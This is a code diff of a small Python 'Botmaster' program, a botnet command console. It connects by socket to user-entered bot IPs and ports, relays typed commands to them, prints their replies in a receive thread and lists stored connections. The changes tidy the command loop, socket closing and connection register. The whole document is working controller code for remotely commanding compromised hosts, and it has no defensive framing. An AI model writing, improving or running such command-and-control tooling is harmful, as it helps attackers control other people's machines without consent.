@@ -3,7 +3,7 @@ from socket import *
 import threading
 from os import system
 from getpass import getpass
-
+from time import sleep
 
 class Botmaster:
 	def __init__(self):
@@ -33,38 +33,56 @@ class Botmaster:
 				print("Input 'exit' to go back.")
 				while cmd != "exit":
 					cmd = input(">>>>")
-					self.sock.send(cmd.encode())
-				sock.close()
+					if cmd != "exit":
+						self.sock.send(cmd.encode())
+				self.sock.close()
+				sleep(2)
+				getpass("Press 'enter' to continue...")
 	def waiting4recv(self):
 		print("Starting 'waiting4recv' method...")
 		while True:
-			r = self.sock.recv(1024).decode()
 			try:
-				print(r)
+				r = self.sock.recv(1024).decode()
+				try:
+					print("{}\n>>>>".format(r))
+				except:
+					pass
 			except:
-				pass
+				print("Closing 'waiting4recv' method.")
+				return 0
 
 if __name__ == '__main__':
 	bm = Botmaster()
 	do = ""
-	bots = {}
+	IPs = []
+	ports = []
 	while do != "exit":
 		system("cls")
-		print('''
+		do = input('''
 		  - B O T   M A S T E R -
 			___________________
 			[C]onnect to a bot
 			[S]how register of connections
 			[exit]
-			''')
-		do = input(">>>>")
+
+			>>>>''')
 		do = do.lower()
 		if do == "c":
 			botip = input("Input the IP of the new bot: ")
-			bots[botip] = input("Input the port that you are going to use to connect to the bot: ")
-			bm.conn2bot(botip, bots[botip])
+			IPs.append(botip)
+			botport = input("Input the port that you are going to use to connect to the bot: ")
+			ports.append(botport)
+			bm.conn2bot(botip, botport)
+			try:
+				bm.sock.close()
+			except:
+				pass
 		elif do == "s":
-			for i in bots:
-				system("cls")
-				print("ip: {}/ port: {}".format(i, bots[i]))
-				getpass("Press 'enter' to continue...")
+			count = 0
+			system("cls")
+			for i in IPs:
+				print("-------------------")
+				print("ip: {}\nport: {}".format(IPs[count], ports[count]))
+				print("-------------------")
+				count += 1
+			getpass("Press 'enter' to continue...")
